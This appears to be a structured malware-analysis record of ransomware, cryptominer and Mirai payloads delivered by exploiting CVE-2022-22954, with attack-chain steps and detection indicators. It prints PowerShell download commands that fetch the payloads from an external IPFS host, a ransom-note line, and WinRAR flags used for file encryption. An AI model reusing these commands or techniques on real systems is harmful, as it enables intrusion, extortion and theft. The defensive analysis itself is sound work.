package_info.package_manager: N/A (malware delivered via remote code execution exploiting CVE-2022-22954)
package_info.package_versions: N/A (affects VMware Workspace ONE Access and Identity Manager vulnerable to CVE-2022-22954)
package_info.why_malicious: These malware packages are delivered via exploitation of a critical VMware RCE vulnerability. They perform unauthorized actions such as deploying ransomware, cryptominers, and botnet clients, exfiltrating data, and maintaining persistence, all without user consent. The payloads are designed to maximize attacker control and monetization of compromised systems.

execution_context.file_location: temp directory (downloaded and executed via injected command)

malicious_snippets.code_behavior: At runtime after exploitation, the code downloads a Mirai variant binary, makes it executable, and runs it with a specific parameter, resulting in the system joining a botnet and awaiting further C2 instructions.

malice_analysis.why_suspicious: Arbitrary download and execution of a binary from an external, non-trusted source is a classic sign of malware deployment.
malice_analysis.violated_expectations: Normal server operation should not involve downloading and running unknown binaries from the internet.
malice_analysis.similar_legitimate_use: Automated update scripts for trusted software (with integrity checks).

execution_context.file_location: Windows: PowerShell script (init.ps1); Linux: shell script (init.sh)

malicious_snippets.code_snippet:
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../phpupdate.exe -OutFile phpupdate.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../config.json -OutFile config.json
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../networkmanager.exe -OutFile networkmanager.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../phpguard.exe -OutFile phpguard.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../init.ps1 -OutFile init.ps1
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../clean.bat -OutFile clean.bat
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../encrypt.exe -OutFile encrypt.exe
# (Similar logic for Linux using curl/wget in init.sh)
malicious_snippets.code_behavior: At runtime after exploitation, the script downloads multiple payloads (miner, ransomware, persistence tools) from external sources, preparing the system for further compromise and monetization.

malice_analysis.why_suspicious: Bulk download of multiple executables/scripts from untrusted sources is highly indicative of a multi-stage malware deployment.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute arbitrary binaries from the internet without validation.
malice_analysis.similar_legitimate_use: Automated deployment in DevOps pipelines (with trusted sources and validation).
key_indicators: Use of public file hosting (cloudflare-ipfs, crustwebsites)

malicious_snippets.code_behavior: At runtime, the script creates a scheduled task to re-execute itself every 10 minutes, ensuring persistence of the malware on the system.

malice_analysis.why_suspicious: Malware commonly uses scheduled tasks to maintain persistence after initial infection.
malice_analysis.violated_expectations: Legitimate scheduled tasks should be created by trusted software and be transparent to administrators.
key_indicators: Scheduled task creation referencing malware script

malicious_snippets.code_behavior: At runtime, the script executes WinRAR to archive and encrypt victim files with a strong password, deletes the originals, and appends a .rar1 extension, effectively performing ransomware encryption.

malice_analysis.why_suspicious: Use of legitimate archiving tool to encrypt and delete user files is a common ransomware tactic.
malice_analysis.violated_expectations: Normal use of WinRAR does not involve automated, mass encryption and deletion of user files.
malice_analysis.similar_legitimate_use: Manual file backup (without deletion or ransom demand).
key_indicators: WinRAR invoked with -df (delete files) and -hp (encrypt headers) options

malicious_snippets.code_snippet: echo 'Your files have been encrypted. To recover them, contact ...' > READ_TO_DECRYPT.txt
malicious_snippets.code_behavior: After encrypting files, the malware drops a ransom note in affected directories, instructing victims on how to pay for decryption.

malice_analysis.why_suspicious: Dropping ransom notes is a hallmark of ransomware activity.
malice_analysis.violated_expectations: Legitimate software does not create ransom demands.

malicious_snippets.code_behavior: At runtime, the script launches a Monero mining process using a downloaded configuration, hijacking system resources for illicit cryptocurrency mining.

malice_analysis.why_suspicious: Unsolicited cryptomining is a common monetization method for malware.
malice_analysis.violated_expectations: Legitimate mining should be user-initiated and transparent.

malicious_snippets.code_behavior: At runtime, the malware scans the network for vulnerable systems and attempts to exploit them using a list of known RCE vulnerabilities, enabling worm-like propagation.

malice_analysis.why_suspicious: Automated exploitation of other systems is a key indicator of malware propagation.
malice_analysis.violated_expectations: Legitimate network management tools do not exploit vulnerabilities without authorization.

attack_chain.action: Attacker exploits CVE-2022-22954 to achieve remote code execution on VMware server.
Malicious command downloads and executes initial payloads (Mirai variant, init.ps1/init.sh).
Persistence is established via scheduled tasks or cron jobs.
Ransomware component encrypts user files and drops ransom note.
Cryptominer is deployed and begins mining Monero using system resources.
Malware scans for and attempts to exploit other vulnerable systems for lateral movement.

behavioral_signatures: Post-exploitation download and execution of binaries from untrusted external sources
Creation of scheduled tasks or cron jobs referencing unknown scripts
Mass file encryption and deletion using WinRAR or similar tools
Automated network scanning and exploitation attempts
file_indicators: Presence of init.ps1, init.sh, phpupdate.exe, networkmanager.exe, phpguard.exe, encrypt.exe, clean.bat
detection_knowledge.how_to_detect: Monitor for suspicious process creation involving wget/curl/Invoke-WebRequest downloading executables/scripts from untrusted domains or IPs. Detect creation of scheduled tasks or cron jobs referencing unknown scripts. Alert on mass file encryption and deletion, especially involving WinRAR or similar tools in temp directories. Look for the presence of known malware file indicators and ransom notes. Monitor for outbound connections to known C2 infrastructure, public file hosting, and mining pools. Correlate with exploitation attempts of CVE-2022-22954.
